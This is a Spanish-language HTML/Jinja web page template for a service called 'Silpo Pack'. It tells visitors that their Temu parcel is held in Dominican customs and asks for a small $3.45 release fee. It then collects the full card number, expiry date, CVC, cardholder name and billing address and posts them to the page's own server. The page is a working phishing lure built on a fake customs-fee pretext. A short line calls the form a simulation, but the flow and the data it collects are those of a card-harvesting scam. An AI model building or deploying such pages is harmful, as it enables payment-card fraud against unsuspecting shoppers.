<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Silpo Pack - Soporte y Pagos</title>
<link rel="icon" type="image/png" href="https://silposystems.com/wp-content/uploads/2024/05/unnamed.jpeg">
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
  :root{
    --blue:#003d99;
    --blue-dark:#002b66;
    --bg:#f6f8fb;
    --card:#ffffff;
    --muted:#6b7a90;
  }
  *{box-sizing:border-box}
  body{
    margin:0;
    font-family:Inter,system-ui,Arial,sans-serif;
    background:var(--bg);
    color:#001a33;
    display:flex;
    align-items:center;
    justify-content:center;
    min-height:100vh;
    padding:20px;
  }

  .card{
    width:420px;
    background:var(--card);
    border-radius:12px;
    box-shadow:0 10px 30px rgba(10,20,40,0.08);
    padding:28px;
  }

  .brand{
    display:flex;
    align-items:center;
    gap:12px;
    margin-bottom:12px;
  }
  .logo{
    width:44px;height:44px;border-radius:8px;background:var(--blue);
    display:inline-block;
  }
  h1{margin:0;font-size:20px;color:var(--blue-dark)}
  .subtitle{margin:6px 0 18px;color:var(--muted);font-size:13px}

  form{display:flex;flex-direction:column;gap:10px}

  .row{display:flex;gap:10px}
  .col{flex:1}

  input, select, textarea{
    width:100%;
    padding:12px 14px;
    border-radius:8px;
    border:1px solid #e3e8ef;
    background:#fbfdff;
    font-size:14px;
    color:#001a33;
  }
  input:focus, select:focus, textarea:focus{outline: none; border-color:var(--blue)}

  .btn{
    background:var(--blue);
    color:#fff;
    border:none;
    padding:12px 14px;
    border-radius:8px;
    font-weight:600;
    cursor:pointer;
    margin-top:8px;
  }
  .btn.secondary{background:#fff;color:var(--blue);border:1px solid #dbe6fb}

  .muted{color:var(--muted);font-size:13px}

  .contact-line{margin-top:14px;font-size:13px;color:var(--muted);text-align:center}

  /* Payment form styling */
  .payment-grid{display:flex;flex-direction:column;gap:10px}
  .card-brand-list{display:flex;gap:8px;flex-wrap:wrap}
  .card-brand{padding:8px 10px;border-radius:8px;border:1px solid #eef4ff;font-size:13px;background:#fff;color:#233;}
  .small{font-size:13px;color:var(--muted)}

  @media (max-width:480px){
    .card{width:100%}
    .row{flex-direction:column}
  }
</style>
</head>
<body>
  <div class="card">
    <div class="brand">
      <div class="logo"></div>
      <div>
        <h1>Silpo Pack</h1>
        <div class="subtitle">Asistente profesional de soporte y gestión de pedidos</div>
      </div>
    </div>

    {% if not mensaje and not pago %}
      <!-- FORMULARIO INICIAL -->
      <form action="/enviar" method="POST">
        <input name="nombre" type="text" placeholder="Nombre completo" required>
        <input name="correo" type="email" placeholder="Correo electrónico" required>
        <input name="codigo" type="text" placeholder="Código de su pedido" required>
        <button class="btn" type="submit">Enviar</button>
      </form>

    {% elif mensaje and not pago %}
      <!-- MENSAJE DE CONFLICTO -->
      <div style="margin-bottom:12px">
        <div class="muted">{{ cliente.nombre }}, tu pedido de Temu tuvo un pequeño conflicto en la aduana dominicana.<br>
        Para liberarlo rápidamente, necesitamos una pequeña comisión de $3.45.</div>
      </div>

      <form action="/pago" method="POST">
        <input type="hidden" name="nombre" value="{{ cliente.nombre }}">
        <input type="hidden" name="correo" value="{{ cliente.correo }}">
        <input type="hidden" name="codigo" value="{{ cliente.codigo }}">
        <button class="btn" type="submit">Pagar ahora ✅</button>
      </form>

      <div class="contact-line">¿Necesitas ayuda? info@silpoglobal.com • 809 955 3550</div>

    {% elif pago %}
      <!-- FORMULARIO DE PAGO -->
      <div style="margin-bottom:12px">
        <div class="muted">Método de pago — Información de la tarjeta</div>
      </div>

      <form action="/procesar_pago" method="POST" id="pagoForm">
        <input type="hidden" name="nombre" value="{{ cliente.nombre }}">
        <input type="hidden" name="correo" value="{{ cliente.correo }}">
        <input type="hidden" name="codigo" value="{{ cliente.codigo }}">

        <div class="payment-grid">
          <input name="card_number" type="text" placeholder="1234 1234 1234 1234" autocomplete="cc-number" required>
          <div class="row">
            <select name="card_brand" class="col">
              <option value="Visa">Visa</option>
              <option value="MasterCard">MasterCard</option>
              <option value="American Express">American Express</option>
              <option value="UnionPay">UnionPay</option>
              <option value="JCB">JCB</option>
              <option value="Discover">Discover</option>
              <option value="Diners Club">Diners Club</option>
            </select>
            <input name="exp" class="col" type="text" placeholder="MM / AA" required>
          </div>

          <div class="row">
            <input name="cvc" class="col" type="text" placeholder="CVC" required>
            <input name="holder" class="col" type="text" placeholder="Nombre del titular de la tarjeta" required>
          </div>

          <div class="small">Dirección de facturación</div>
          <select name="country" required>
            <option value="República Dominicana">República Dominicana</option>
          </select>
          <input name="addr1" type="text" placeholder="Línea 1 de dirección" required>
          <input name="addr2" type="text" placeholder="Línea 2 de dirección (opcional)">
          <div class="row">
            <input name="postal" class="col" type="text" placeholder="Código postal" required>
            <input name="city" class="col" type="text" placeholder="Ciudad" required>
          </div>

          <div class="row">
            <button class="btn" type="submit">Confirmar pago</button>
            <a href="/" class="btn secondary" style="text-decoration:none;display:inline-flex;align-items:center;justify-content:center">Cancelar</a>
          </div>

          <div class="small muted">Nota: Este formulario es una simulación. Nunca almacenes números de tarjeta ni CVC en tu servidor. Integra un proveedor de pagos seguro.</div>
        </div>
      </form>
    {% endif %}

  </div>

  <!-- SCRIPT PARA CÍRCULO DE CARGANDO AL CONFIRMAR PAGO -->
  <script>
    const pagoForm = document.getElementById('pagoForm');

    if (pagoForm) {
      pagoForm.addEventListener('submit', function(e){
        // crear spinner
        const spinner = document.createElement('div');
        spinner.style.width = '40px';
        spinner.style.height = '40px';
        spinner.style.border = '4px solid #ccc';
        spinner.style.borderTopColor = '#003d99';
        spinner.style.borderRadius = '50%';
        spinner.style.animation = 'spin 1s linear infinite';
        spinner.style.margin = '20px auto';
        this.parentNode.appendChild(spinner);
      });

      // animación CSS
      const style = document.createElement('style');
      style.innerHTML = `
        @keyframes spin { to { transform: rotate(360deg); } }
      `;
      document.head.appendChild(style);
    }
  </script>
</body>
</html>
